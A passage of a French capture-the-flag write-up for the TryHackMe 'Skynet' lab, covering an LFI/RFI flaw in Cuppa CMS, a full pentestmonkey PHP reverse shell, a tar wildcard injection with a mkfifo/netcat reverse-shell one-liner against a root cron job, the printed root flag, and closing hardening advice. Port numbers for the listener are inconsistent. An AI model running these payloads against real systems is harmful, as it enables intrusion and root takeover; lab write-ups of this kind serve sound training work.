Obtention du shell

Cuppa CMS est vulnérable à une LFI et une RFI. En effet dans son code source, le fichier /alerts/alertConfigField.php on trouve à la ligne 22

php
<?php include($_REQUEST["urlConfig"]); ?>
  • $_REQUEST["urlConfig"] récupère n’importe quelle donnée envoyée par l’utilisateur via l’URL ou le formulaire
  • include() prend un fichier et l’éxecute comme code

Ainsi l’attaquant détourne l’utilisation prévue du paramètre pour lire un fichier qu’il ne devait pas voire et peut lire un fichier interne du serveur (LFI). Pire si la configuration PHP(allow_include) le permet l’utilisateur peut inclure un fichier stocké sur un serveur distant(RFI)

Vérifions maintenant la présence de la vulnérabilité.

console
http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

On as accès au contenu entier du fichier. La cible est donc vulnérable. On peut donc essayer d’exploiter le RFI pour obtenir un shell. Sur notre machine on cré un fichier shell.php qui contient le script de notre reverse shell de pentester monkey

php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '<notre_ip>';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();

    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }

    if ($pid) {
        exit(0);  // Parent exits
    }
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}

On a aussi découvert que ce script de sauvegarde est exécuter chaque minutes par root. On a donc notre vecteur d’escalade de privilèges appelé Tar Wilcard Injection.

En effet, quand on utilise * le shell se charge de remplacer ça par la liste des fichiers. Par exemple si dans notre dossier on a

console
abc
acd
shell

Et on tape

bash
$ tar *

On a le résultat

bash
$ tar abc acd shell

On peut exploiter ce mécanisme car tar dispose de plusieurs options:

  • —checkpoint=N qui permet d’effectuer une action tous les N nrégistrements traités
  • —checkpoint-action=exec cmd permet d’exécuter une commande à chaque chekpoint

On peut exploiter ces faille en créé dans fichiers —checkpoint=N et —checkpoint-action=exec= cmd et quand tar va l’éxécuter ils seront traité comme des options et non des fichiers. On se rend donc dans le dossier /var/www/html

On lance sur notre machine un écouteur sur le port 9001

bash
$ nc -lvnp 9002

Ensuite on fais

bash
$ echo "" > --checkpoint=1
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc  9002 >/tmp/f' > shell.sh
$ chmod +x shell.sh
$ echo "" > '--checkpoint-action=exec=sh shell.sh'

On obtients ainsi un shell root.

Pourquoi ça marche ?

Lorsque le script de backup est exécuté, il lance la commande tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh qui lance dans script de reverse shell en root d’où l’obtention du shell

Capture de root flag

Après l’obtention du shell on peut capturer le flag root

bash
$ root@skynet:/var/www/html# ls /root
$ ls /root
$ root.txt
$ root@skynet:/var/www/html# cat /root/root.txt
$ cat /root/root.txt
$ 3f0372db24753accc7179a282cd6a949
$ root@skynet:/var/www/html#

⛳Root Flag: 3f0372db24753accc7179a282cd6a949

Recommendations

  • Désactiver la connection anonyme aux partages SMB
  • Restreindre l’accès aux fichiers sensibles
  • Eviter d’utiliser les versions vulnérables des CMS
  • Ne pas laisser trainer des scripts root dans les dossiers d’utilisateurs standards
  • Appliquer le principe du moindre privilège
  • Utiliser des chemins absolues
